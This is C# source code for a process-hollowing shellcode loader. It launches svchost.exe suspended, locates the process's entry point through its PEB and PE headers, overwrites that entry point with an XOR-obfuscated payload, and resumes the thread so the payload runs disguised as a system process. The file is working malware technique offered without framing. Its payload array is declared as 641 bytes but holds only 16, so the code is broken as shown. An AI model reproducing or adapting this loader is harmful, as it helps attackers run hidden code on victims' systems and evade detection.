using System;
using System.Threading;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace Process_Hollowing
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
    IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
    uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
    [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION
    lpProcessInformation);
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern UInt32 ZwQueryInformationProcess(
    IntPtr hProcess,
    int procInformationClass,
    ref PROCESS_BASIC_INFORMATION procInformation,
    UInt32 ProcInfoLen,
    ref UInt32 retlen);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
    IntPtr hProcess,
    IntPtr lpBaseAddress,
    [Out] byte[] lpBuffer,
    int dwSize,
    out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        static byte[] decode(byte[] payload, int key)
        {
            for (int i = 0; i < payload.Length; i++)
            {
                payload[i] ^= (byte)key;
            }
            return payload;
        }
        static void Main(string[] args)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref pbi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)pbi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            int key = 66;
            byte[] buf = new byte[641] {
0xbe,0x0a,0xc1,0xa6,0xb2,0xaa,0x8e,0x42,0x42,0x42,0x03,0x13,0x03,
0x12,0x10,0x13
};

            WriteProcessMemory(hProcess, addressOfEntryPoint, decode(buf,key), buf.Length, out nRead);

            ResumeThread(pi.hThread);
        }
    }
}
